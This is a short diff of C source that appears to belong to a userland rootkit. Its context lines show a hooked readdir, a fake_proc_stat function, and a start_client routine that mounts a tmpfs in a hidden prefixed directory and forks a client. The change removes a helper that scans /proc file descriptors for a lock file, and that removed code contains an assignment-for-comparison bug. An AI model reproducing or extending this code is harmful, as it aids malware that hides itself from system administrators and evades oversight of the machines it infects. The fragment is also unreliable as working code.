@@ -143,41 +143,6 @@ int fake_proc_stat(void)
     return fd;
 }
 
-bool file_open(char *filename)
-{
-    ORIG(readdir, false);
-
-    DIR *dirp = opendir("/proc");
-    if (!dirp) return false;
-    struct dirent *dir;
-    while ((dir = original_readdir(dirp)))
-    {
-        char *pid = dir->d_name;
-        if (strspn(pid, "0123456789") != strlen(pid)) continue;
-        char fd_path[128];
-        sprintf(fd_path, "/proc/%s/fd", pid);
-        DIR *fdp = opendir(fd_path);
-	if (!fdp) continue;
-        while ((dir = original_readdir(fdp)))
-        {
-            sprintf(fd_path, "/proc/%s/fd/%s", pid, dir->d_name);
-            char buf[2048];
-            ssize_t ret = readlink(fd_path, buf, sizeof(buf));
-            if (ret == -1) continue;
-            buf[ret] = 0;
-            if (strcmp(buf, filename) == 0)
-            {
-                closedir(fdp);
-                closedir(dirp);
-                return true;
-            }
-        }
-        closedir(fdp);
-    }
-    closedir(dirp);
-    return false;
-}
-
 // this better fucking work
 bool start_client(void)
 {
@@ -185,14 +150,7 @@ bool start_client(void)
     int fd;
     mkdir("/" PREFIX "/tmp", 0777);
     mount("none", "/" PREFIX "/tmp", "tmpfs", "");
-    if ((fd = open(lock_name, O_CREAT | O_EXCL)) == -1)
-    {
-        if (!file_open(lock_name))
-	{
-	    remove(lock_name);
-	    if ((fd = open(lock_name, O_CREAT | O_EXCL)) = -1) return false;
-	}
-    }
+    if ((fd = open(lock_name, O_CREAT | O_EXCL)) == -1) return false;
 
     pid_t pid;
     if (!(pid = fork()))
